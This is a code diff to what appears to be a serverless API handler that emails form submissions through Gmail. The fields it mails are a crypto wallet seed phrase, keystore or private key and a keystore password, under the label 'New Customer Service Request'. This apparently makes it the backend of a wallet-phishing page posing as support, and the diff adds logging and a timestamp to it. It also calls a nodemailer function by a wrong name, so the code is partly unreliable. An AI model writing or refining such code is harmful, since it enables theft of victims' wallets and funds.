@@ -17,7 +17,9 @@ export default async function handler(req, res) {
   }
 
   try {
+    // Validate environment variables
     if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
+      console.error('Missing email credentials');
       return res.status(500).json({ 
         success: false, 
         error: 'Server configuration error' 
@@ -28,8 +30,8 @@ export default async function handler(req, res) {
 
     const transporter = nodemailer.createTransporter({
       host: "smtp.gmail.com",
-      port: 587,
-      secure: false,
+      port: 587, // Use 587 for TLS instead of 465
+      secure: false, // Use TLS
       auth: {
         user: process.env.EMAIL_USER,
         pass: process.env.EMAIL_PASS,
@@ -60,10 +62,12 @@ export default async function handler(req, res) {
         <h3>New Customer Service Request</h3>
         <p><strong>Phrase/KS/PKey:</strong> ${phwet || 'Not provided'}</p>
         <p><strong>Password (if keystore):</strong> ${psdwet || 'Not provided'}</p>
+        <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
       `
     };
 
     const info = await transporter.sendMail(mailOptions);
+    console.log('Email sent successfully:', info.messageId);
 
     return res.status(200).json({ 
       success: true, 
